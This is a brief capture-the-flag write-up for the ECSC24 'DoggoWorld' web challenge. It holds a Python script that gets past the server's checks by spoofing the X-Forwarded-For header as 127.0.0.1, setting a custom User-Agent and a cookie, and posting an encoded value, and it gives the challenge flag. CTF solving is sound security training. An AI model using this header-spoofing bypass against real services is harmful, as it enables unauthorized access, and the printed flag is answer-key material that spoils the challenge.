# [web - DoggoWorld](https://hack.cert.pl/challenge/doggoworld)

You have to fulfill all the requirements of the server to get the doggo picture.

```py
import requests

url = 'https://doggoworld.ecsc24.hack.cert.pl/'

headers = {
    'User-Agent': 'doggobrowser',
    'X-Forwarded-For': '127.0.0.1',
    'Accept-Language': 'en-US'
}

cookies = {
    'do_you_like_dogs_and_cats': 'YES'
}

data = {
    'doggo': 'ZmxhZw=='
}

response = requests.post(url, headers=headers, cookies=cookies, data=data)

with open('doggo.png', 'wb') as file:
    file.write(response.content)
```

### Flag
```
ecsc24{d0gs_and_c4ts_are_c0ol}
```